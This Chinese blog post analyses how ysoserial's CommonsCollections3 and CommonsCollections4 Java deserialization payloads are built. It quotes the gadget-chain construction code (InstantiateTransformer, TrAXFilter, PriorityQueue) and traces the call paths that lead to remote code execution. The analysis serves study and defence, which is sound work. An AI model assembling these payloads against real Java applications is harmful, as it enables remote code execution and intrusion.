---
title: Ysoserial工具解读（三）
date: 2019-10-31 11:21:05
tags: [Java, RCE,反序列化]
categories: 漏洞分析
cover: java_cover.png
---

前面两篇已经介绍了不少基础知识，接下来可以加快分析的速度了。今天分析CommonsCollections3.java和CommonsCollections4.java中用到的类，主要是`InstantiateTransformer`类和`TrAXFilter`类。

<!-- more -->

## CommonsCollections3的Payload构造方式

```java
/*	先贴代码为敬：
*/

import javax.xml.transform.Templates;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.functors.InstantiateTransformer;

public Object getObject(final String command) throws Exception {
    Object templatesImpl = Gadgets.createTemplatesImpl(command);

    final Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(TrAXFilter.class),
        // 这里不再是InvokeTransformer类，而是InstantiateTransformer类
        new InstantiateTransformer(
            new Class[] { Templates.class },
            new Object[] { templatesImpl } )};

    // 这部分代码和CommonsCollection1完全一样
    // inert chain for setup
    final Transformer transformerChain = new ChainedTransformer(
        new Transformer[]{ new ConstantTransformer(1) });
    final Map innerMap = new HashMap();
    final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
    final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
    final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
    Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

    return handler;
}
```

既然上面的代码段内主要用到`InstantiateTransformer`类和`TrAXFilter`类，那就看看它们的具体内容。

### `InstantiateTransformer`类

这个调用链前半部分和CommonsCollections1的一样哈，也就是`AnnotationInvocationHandler.readObject() -> Map$Proxy.entrySet() ->					AnnotationInvocationHandler.invoke() ->	LazyMap.get() -> ChainedTransformer.transform() `

我们之前分析过`ConstantTransformer`类的`transform()`方法：

```java
/*	ConstantTransformer.java
*/

public ConstantTransformer(Object constantToReturn) {
    super();
    iConstant = constantToReturn;
}

// 即不管输入参数是什么，都返回初始化时传入的iConstant字段值
public Object transform(Object input) {
    return iConstant;
}
```

在本例中，`ConstantTransformer.transform()`的返回对象就是个`TrAXFilter`类。它将被传入`InstantiateTransformer.transform()`中，贴一下有关代码：

```java
/*	InstantiateTransformer.java
*/
public class InstantiateTransformer implements Transformer, Serializable {

    /** 构造函数的参数类型数组 */
    private final Class[] iParamTypes;
    /** 构造函数的参数值数组 */
    private final Object[] iArgs;
    
    public InstantiateTransformer(Class[] paramTypes, Object[] args) {
        super();
        // 根据payload构造代码这里的参数类型是javax.xml.transform.Templates类
        iParamTypes = paramTypes;
        // 根据payload构造代码这里传入的是恶意的templatesImpl对象
        iArgs = args;
    }
    
    public Object transform(Object input) {
        try {
            if (input instanceof Class == false) {
                throw new FunctorException(
                    "InstantiateTransformer: Input object was not an instanceof Class, it was a "
                        + (input == null ? "null object" : input.getClass().getName()));
            }
            // 获取输入类的构造函数,也就是TrAXFilter的构造函数
            Constructor con = ((Class) input).getConstructor(iParamTypes);
            // 创建一个输入类的实例,即将templatesImpl对象作为入参传给TrAXFilter的构造函数
            return con.newInstance(iArgs);

        } 
        * * * *
    }
```
于是，恶意的`templatesImpl`对象就被传入了`TrAXFilter`类的构造函数：

### `TrAXFilter`类

```java
/*	TrAXFilter.java
*/
public TrAXFilter(Templates templates)  throws
    TransformerConfigurationException
{
    _templates = templates;
    _transformer = (TransformerImpl) templates.newTransformer();
    * * * *
}
```

接下来的故事就跟CommonsCollections2里分析的一模一样了，因此CommonsCollections3可以看作是前两个payload构造方法的结合产物。

## CommonsCollections4的Payload构造方式

```java
public Queue<Object> getObject(final String command) throws Exception {
    Object templates = Gadgets.createTemplatesImpl(command);

    ConstantTransformer constant = new ConstantTransformer(String.class);

    Class[] paramTypes = new Class[] { String.class };
    Object[] args = new Object[] { "foo" };
    InstantiateTransformer instantiate = new InstantiateTransformer(
        paramTypes, args);

    // grab defensively copied arrays
    paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
    args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");

    ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });

    // create queue with numbers
    PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));
    queue.add(1);
    queue.add(1);

    // 利用反射机制方式实现ConstantTransformer的初始化
    // 效果同 ConstantTransformerconstant= new ConstantTransformer(TrAXFilter.class)
    Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
    // 利用反射机制方式实现InstantiateTransformer的初始化
    // 效果同 InstantiateTransformer instantiate= new InstantiateTransformer(new Class[] { Templates.class },new Object[] { templatesImpl } )    
    paramTypes[0] = Templates.class;
    args[0] = templates;

    return queue;
}
```

这个构造方法可以看做是CommonsCollections2的变种，因此它们前半段的调用链也是相同的：`PriorityQueue.readObject() -> heapify() -> siftDown() -> siftDownUsingComparator() -> TransformingComparator.compare() -> ChainedTransformer.transform() `；该构造方式后半部分用的是和CommonsCollections3一样的类，不过利用反射机制实现初始化，因此调用链也一样，这里不再详述。
